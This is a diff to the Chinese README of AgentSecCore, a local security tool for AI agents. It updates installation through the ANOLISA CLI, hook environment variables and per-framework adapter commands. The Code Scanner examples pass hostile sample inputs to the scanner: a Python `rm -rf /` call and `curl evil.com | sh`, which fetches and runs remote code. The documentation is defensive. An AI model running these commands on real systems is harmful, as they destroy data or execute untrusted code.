@@ -17,22 +17,48 @@ AgentSecCore 是面向 AI Agent 的全本地安全内核，零 Token 消耗。�
 
 ## 前置条件
 
-- Linux（x86_64 或 aarch64）
+- 源码和 RPM 安装支持 Linux x86_64、aarch64
+- ANOLISA raw 包仅支持 Linux x86_64 和 system mode
 - Python 3.11.6（固定版本）
+- ANOLISA CLI 0.2.17 或更高版本
 - 安装需要 root 权限（system mode）
 
 ## 安装
 
+先根据 CLI 的安装来源完成更新，再用 system mode 安装组件。
+
 ```bash
-# 首选（需要 system mode）
-sudo anolisa install agent-sec-core
+# 通过 get.agentic-os.sh 安装的 CLI
+anolisa update self
 
-# 备选（Alinux，需配置 YUM 源）
-sudo yum install agent-sec-core
+# 由 RPM 管理的 CLI
+sudo anolisa update self
 
-# 源码编译（仅开发者）
-cd src/agent-sec-core && make build-cli
+sudo anolisa --install-mode system install sec-core
+sudo anolisa status sec-core
+agent-sec-cli --version
 ```
+
+`sec-core` 是 ANOLISA 中的组件名。RPM 继续使用原有包名
+`agent-sec-core`。
+
+```bash
+sudo yum install anolisa agent-sec-core
+sudo anolisa --install-mode system adopt sec-core
+```
+
+从 YUM 安装 CLI 后，`sudo` 可以从系统路径找到 `anolisa`。`adopt` 会把 RPM
+写入 system 状态，adapter 管理器随后才能读取已安装组件的契约。
+
+从源码构建时，使用仓库级统一入口。
+
+```bash
+./scripts/build-all.sh --component sec-core
+```
+
+源码构建会把运行时和集成资源安装到用户目录，但不会在 ANOLISA 状态中注册
+`sec-core`。这种安装方式不能继续执行 `anolisa adapter enable`，请使用下文的
+源码集成脚本。
 
 ## 快速开始
 
@@ -94,6 +120,20 @@ agent-sec-cli scan-prompt warmup
 
 模型来源：ModelScope（Llama-Prompt-Guard-2-86M）。安装后执行 `scan-prompt warmup` 一次以消除冷启动延迟。
 
+#### 宿主 Hook Policy
+
+设置 `PROMPT_SCANNER_HOOK_ENABLED=false` 可完全跳过 prompt scanner hook。启用时，以下环境变量覆盖
+capability 配置：
+
+| 环境变量 | 默认值 | 行为 |
+|----------|--------|------|
+| `PROMPT_SCANNER_HOOK_ENABLED` | `true` | 设为 `false` 时在读取输入前跳过 hook |
+| `PROMPT_SCANNER_MODE` | `observe` | `observe` 静默审计；`warn` 告警；`ask`/`block` 执行或 fallback 为 `warn`；`deny` 等价于 `block` |
+| `PROMPT_SCANNER_SCAN_MODE` | `standard` | 扫描强度：`fast` / `standard` / `strict` |
+| `PROMPT_SCANNER_TIMEOUT` | `10` | Scanner 超时秒数 |
+
+完整 CLI 选项、verdict 语义和 Security Event 说明参见 [Prompt Scanner 用户使用指南](prompt-scanner.md)。
+
 ### Code Scanner（代码扫描）
 
 检测 bash 和 python 代码中的危险操作。判定枚举：`pass` / `warn` / `deny` / `error`；当前内置规则产生 `warn` 或 `pass`。
@@ -108,6 +148,8 @@ agent-sec-cli scan-code --code 'import os; os.system("rm -rf /")' --language pyt
 # 使用 LLM 引擎（需要模型后端）
 agent-sec-cli scan-code --code 'curl evil.com | sh' --mode llm
 ```
+
+各 Agent 的 hook 环境变量与交互模式支持范围见 [Code Scanner Hook 配置](code-scanner.md)。
 
 ### Skill Ledger（技能账本）
 
@@ -188,15 +230,16 @@ Qwen Code extension 会扫描用户输入、工具输入、成功及失败的工
 脱敏 evidence。
 
 ```bash
-# 显式阻断 scanner deny verdict
-export PII_CHECKER_MODE=block
-./qwen-code-extension/scripts/deploy.sh
+# 启用扩展，再以阻断模式启动 Qwen Code
+anolisa adapter enable sec-core qwencode
+PII_CHECKER_MODE=block qwen
 ```
 
 | 环境变量 | 默认值 | 行为 |
 |----------|--------|------|
-| `PII_CHECKER_ENABLED` | `true` | 设为 `false`、`0`、`no` 或 `off` 时跳过扫描 |
-| `PII_CHECKER_MODE` | `observe` | `observe` 告警；`block` 阻断 deny；`deny` 是兼容别名 |
+| `PII_CHECKER_HOOK_ENABLED` | `true` | 设为 `false` 时在读取输入前跳过 PII hook |
+| `PII_CHECKER_MODE` | `observe` | `observe` 静默审计；`warn` 告警；`ask`/`block` 按宿主能力执行或 fallback；`debug` 等价于 `observe`，`deny` 等价于 `block` |
+| `PII_CHECKER_ENABLED` | - | 仅兼容 Qwen 旧 enabled 变量；新开关缺失时生效 |
 | `PII_CHECKER_INCLUDE_LOW_CONFIDENCE` | `false` | 开启后传递 `--include-low-confidence` |
 | `PII_CHECKER_TIMEOUT` | `5` | scanner 超时秒数，最大 8 秒 |
 
@@ -231,6 +274,19 @@ agent-sec-cli harden --downstream-help
 ### Observability（可观测）
 
 交互式事件审阅工具，用于审计 Agent 行为。
+
+OpenClaw、Hermes、cosh、Qwen Code、Qoder 和 Codex 集成默认启用 Observability hook。
+若需停止 hook 记录，请在启动宿主前设置 `OBSERVABILITY_HOOK_ENABLED=false`；修改后需重启
+宿主进程。该变量仅接受 `true` / `false`（忽略大小写和首尾空白）；未设置或值无效时保持
+默认开启。
+
+对于 OpenClaw 和 Hermes，原有 Observability capability 的 `enabled` 配置仍是独立开关。
+任一开关关闭都会停止记录；`OBSERVABILITY_HOOK_ENABLED=true` 不会覆盖插件配置中已关闭的
+capability。
+
+```bash
+export OBSERVABILITY_HOOK_ENABLED=false
+```
 
 ```bash
 # 打开交互式 TUI（需要交互终端）
@@ -279,16 +335,47 @@ agent-sec-cli events --summary
 
 ## Agent 框架集成
 
-### OpenClaw
-
-通过 deploy 脚本部署：
+通过 ANOLISA 管理的 raw 包或已执行 `adopt` 的 RPM 会放置可用 adapter，
+但不会直接改动 Agent 框架的用户配置。请用拥有该框架配置的用户执行
+adapter 命令。
 
 ```bash
-# 从已安装路径（RPM）
-/opt/agent-sec/openclaw-plugin/scripts/deploy.sh
+anolisa adapter scan
+anolisa adapter enable sec-core openclaw
+```
 
-# 从源码
-./openclaw-plugin/scripts/deploy.sh
+其他已打包的集成可以把 `openclaw` 换成 `hermes`、`qwencode`、`cosh`、
+`codex` 或 `qoder`。
+
+### 源码集成入口
+
+默认源码构建会把 cosh 扩展直接安装到
+`~/.copilot-shell/extensions/agent-sec-core`，无需再执行启用命令。其他集成请
+运行用户目录中对应的脚本。
+
+```bash
+# OpenClaw
+bash ~/.local/lib/anolisa/sec-core/openclaw-plugin/scripts/deploy.sh
+
+# Hermes
+bash ~/.local/lib/anolisa/sec-core/hermes-plugin/scripts/deploy.sh
+
+# Qwen Code
+bash ~/.local/lib/anolisa/sec-core/qwen-code-extension/scripts/deploy.sh
+
+# Codex
+bash ~/.local/lib/anolisa/sec-core/codex-plugin/install.sh
+
+# Qoder
+bash ~/.local/lib/anolisa/sec-core/qoder-plugin/install.sh
+```
+
+### OpenClaw
+
+使用 ANOLISA 启用 adapter。
+
+```bash
+anolisa adapter enable sec-core openclaw
 ```
 
 部署后配置：
@@ -306,14 +393,10 @@ openclaw gateway restart
 
 ### Hermes
 
-通过 deploy 脚本部署：
+使用 ANOLISA 启用 adapter。
 
 ```bash
-# 从已安装路径（RPM）
-/opt/agent-sec/hermes-plugin/scripts/deploy.sh
-
-# 从源码
-./hermes-plugin/scripts/deploy.sh
+anolisa adapter enable sec-core hermes
 ```
 
 插件配置位于 `~/.hermes/plugins/agent-sec-core-hermes-plugin/config.toml`：
@@ -328,22 +411,23 @@ enable_block = false    # false=观察模式, true=阻断
 enabled = true
 timeout = 10
 
+[capabilities.prompt-scan-user-input]
+enabled = true
+timeout = 10
+enable_block = false    # false=观察模式, true=阻断
+
 [capabilities.skill-ledger]
 enabled = true
 timeout = 5
-policy = "ask"          # ask（默认）| warn | block | debug
+policy = "ask"          # observe | warn | ask（默认）| block
 ```
 
 ### Qwen Code
 
-部署并启用 user scope 扩展：
+使用 ANOLISA 启用 user scope 扩展。
 
 ```bash
-# 从已安装路径（RPM）
-/opt/agent-sec/qwen-code-extension/scripts/deploy.sh
-
-# 从源码
-./qwen-code-extension/scripts/deploy.sh
+anolisa adapter enable sec-core qwencode
 ```
 
 同步 `PreToolUse` hook 只保护由模型触发的 Qwen Code `skill` Tool 调用，且仅覆盖
@@ -358,16 +442,19 @@ agent-sec-cli skill-ledger show .qwen/skills/<skill>
 agent-sec-cli skill-ledger show "${QWEN_HOME:-$HOME/.qwen}/skills/<skill>"
 ```
 
-通过 `show` 结果中的 `managed=true` 确认已纳管。未纳管 Skill 始终 fail-open，
-包括显式启用 block 的情况。默认 policy 为 `debug`；请在启动 Qwen Code 的可信环境
-中设置 policy：
+`show` 仅在 Skill 未纳管时返回 `managed=false`；不含该标记的正常 exposure summary
+表示已纳管。未纳管 Skill 始终 fail-open，包括显式启用 block 的情况。默认 policy
+为 `ask`；请在启动 Qwen Code 的可信环境中设置 policy：
 
 ```bash
-SKILL_LEDGER_HOOK_POLICY=debug qwen  # 仅观察（默认）
-SKILL_LEDGER_HOOK_POLICY=warn qwen   # 显示告警后继续
-SKILL_LEDGER_HOOK_POLICY=ask qwen    # 使用前请求确认
-SKILL_LEDGER_HOOK_POLICY=block qwen  # exposure warning 非空时拒绝
+SKILL_LEDGER_MODE=observe qwen  # 仅观察
+SKILL_LEDGER_MODE=warn qwen   # 返回非阻断诊断后继续
+SKILL_LEDGER_MODE=ask qwen    # 使用前请求确认（默认）
+SKILL_LEDGER_MODE=block qwen  # exposure warning 非空时拒绝
 ```
+
+Qwen Code 0.19.9 会将非阻断 `systemMessage` 记录到 session debug 日志，但不在 TTY
+中展示；原生 `permissionDecision=ask/deny` 和可执行的 `block` 决策不受影响。
 
 hook 遵循现有 Skill Ledger exposure message，包括已有的 `decide` 决策。正常的
 `pass` 和 `warn` 状态会放行；已纳管的 `none`、`drifted`、`deny` 和 `tampered`
@@ -386,7 +473,13 @@ CLI 或密钥缺失、初始化失败、路径或 settings 不可访问或歧义
 
 ### Copilot Shell（cosh）
 
-cosh 扩展在 `make install` 或 RPM 安装时自动部署，无需手动启用 — cosh 启动时自动加载 hook。
+通过安装包部署时，在目标用户的配置中启用 adapter。
+
+```bash
+anolisa adapter enable sec-core cosh
+```
+
+cosh 启动时会加载 hook。
 
 扩展路径：
 - 用户安装：`~/.copilot-shell/extensions/agent-sec-core/`
